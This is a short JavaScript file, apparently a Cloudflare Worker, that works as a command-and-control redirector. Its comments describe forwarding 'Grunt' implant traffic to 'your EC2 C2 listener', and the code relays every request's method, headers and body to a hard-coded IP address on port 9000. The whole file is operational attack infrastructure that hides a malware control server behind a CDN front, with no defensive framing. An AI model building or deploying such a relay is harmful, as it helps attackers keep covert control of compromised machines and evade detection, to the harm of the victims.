export default {
    async fetch(request, env) {
        const url = new URL(request.url);
        
        // For Grunt requests (no matching static file),
        // forward to your EC2 C2 listener
        const backendUrl = `http://18.207.141.118:9000${url.pathname}${url.search}`;
        
        const modifiedRequest = new Request(backendUrl, {
            method: request.method,
            headers: request.headers,
            body: request.body
        });
        
        return fetch(modifiedRequest);
    }
};